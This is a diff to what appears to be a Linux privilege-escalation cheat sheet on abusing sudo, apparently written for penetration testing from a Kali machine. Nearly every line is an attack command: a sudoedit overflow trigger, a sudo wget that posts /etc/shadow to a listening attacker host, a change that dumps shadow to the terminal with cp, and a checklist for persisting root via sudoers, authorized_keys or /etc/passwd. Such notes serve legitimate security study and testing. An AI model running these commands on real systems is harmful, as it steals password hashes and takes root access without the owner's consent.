@@ -47,5 +47,6 @@ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
 ## Read and write files through an allowed program
 A root-only file sent to Kali by wget, with nc -lvnp <LPORT> listening there:
 sudo wget --post-file=/etc/shadow http://<LHOST>:<LPORT>/
-sudo cp /etc/shadow /tmp/shadow
+cp, to the terminal, since a copy it writes keeps shadow's owner and mode:
+sudo cp /etc/shadow /dev/stdout
 - [ ] Write as root: a sudoers line, an SSH key in /root/.ssh/authorized_keys, or a root line in /etc/passwd
